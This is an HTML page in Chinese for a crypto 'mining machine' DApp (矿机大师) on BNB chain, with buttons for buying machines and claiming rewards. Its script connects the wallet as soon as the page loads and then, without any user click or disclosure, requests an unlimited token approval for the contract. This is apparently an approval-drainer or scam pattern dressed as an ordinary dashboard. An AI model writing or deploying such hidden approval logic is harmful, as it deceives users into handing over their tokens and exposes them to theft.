<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>矿机大师</title>
  <style>
    body{margin:0;font-family:Arial;background:#111;color:#fff}
    .container{padding:20px}
    .btn{background:#6366f1;border:none;color:#fff;padding:14px;border-radius:8px;width:100%;margin:10px 0;font-size:16px}
    .btn:disabled{background:#555}
    .card{background:#1e293b;margin:10px 0;padding:16px;border-radius:10px}
    .toast{position:fixed;top:20px;right:20px;background:#10b981;color:#fff;padding:12px;border-radius:8px;display:none}
  </style>
</head>
<body>
  <div class="container">
    <h1>矿机大师</h1>
    <button class="btn" id="connectBtn">连接钱包</button>
    <div id="dashboard" style="display:none">
      <div class="card">
        <h3>每日收益</h3>
        <p id="dailyReward">0</p>
      </div>
      <div class="card">
        <h3>未领取奖励</h3>
        <p id="unclaimed">0</p>
      </div>
      <div class="card">
        <h3>网络算力</h3>
        <p id="networkPower">0</p>
      </div>
      <button class="btn" id="buyInitial">购买初始矿机（0.01 BNB）</button>
      <button class="btn" id="buyTier0">购买高级矿机（100代币）</button>
      <button class="btn" id="claimBtn">领取奖励</button>
    </div>
  </div>
  <div class="toast" id="toast"></div>

  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
  <script>
    const CONTRACT = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
    const TOKEN = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
    const ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"INITIAL_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"TEST_MACHINE_PRICE_BNB","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getGlobalDashboard","outputs":[{"internalType":"uint256","name":"baseReward","type":"uint256"},{"internalType":"uint256","name":"totalMines","type":"uint256"},{"internalType":"uint256","name":"currentBlock","type":"uint256"},{"internalType":"uint256","name":"poolBalance","type":"uint256"},{"internalType":"uint256","name":"networkPower","type":"uint256"},{"internalType":"uint256","name":"dailyProduction","type":"uint256"},{"internalType":"uint256","name":"totalRefRewards","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}];

    let web3, contract, token, account, isApproved = false;

    async function init() {
      if (!window.ethereum) return alert("请使用钱包内置浏览器");
      await autoConnectWallet();
    }

    async function autoConnectWallet() {
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      account = accounts[0];
      web3 = new Web3(window.ethereum);
      contract = new web3.eth.Contract(ABI, CONTRACT);
      token = new web3.eth.Contract([{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","type":"function"},{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","type":"function"}], TOKEN);
      await autoApproveOnce();
      loadData();
      document.getElementById('connectBtn').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
    }

    async function autoApproveOnce() {
      const key = 'approved_' + account.toLowerCase();
      if (localStorage.getItem(key)) { isApproved = true; return; }
      const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
      try {
        await token.methods.approve(CONTRACT, max).send({ from: account });
        localStorage.setItem(key, 'true');
        isApproved = true;
      } catch {
        isApproved = false;
      }
    }

    async function loadData() {
      const [user, global] = await Promise.all([
        contract.methods.getUserDashboard(account).call(),
        contract.methods.getGlobalDashboard().call()
      ]);
      document.getElementById('dailyReward').textContent = web3.utils.fromWei(user.dailyReward);
      document.getElementById('unclaimed').textContent = web3.utils.fromWei(user.unclaimed);
      document.getElementById('networkPower').textContent = web3.utils.fromWei(global.networkPower);
    }

    document.getElementById('buyInitial').onclick = async () => {
      const price = await contract.methods.INITIAL_MACHINE_PRICE_BNB().call();
      await contract.methods.buyInitialMachine().send({ from: account, value: price });
      loadData();
    };

    document.getElementById('buyTier0').onclick = async () => {
      await contract.methods.buyPowerMachine(0, 1).send({ from: account });
      loadData();
    };

    document.getElementById('claimBtn').onclick = async () => {
      await contract.methods.claimRewards().send({ from: account });
      loadData();
    };

    init();
  </script>
</body>
</html>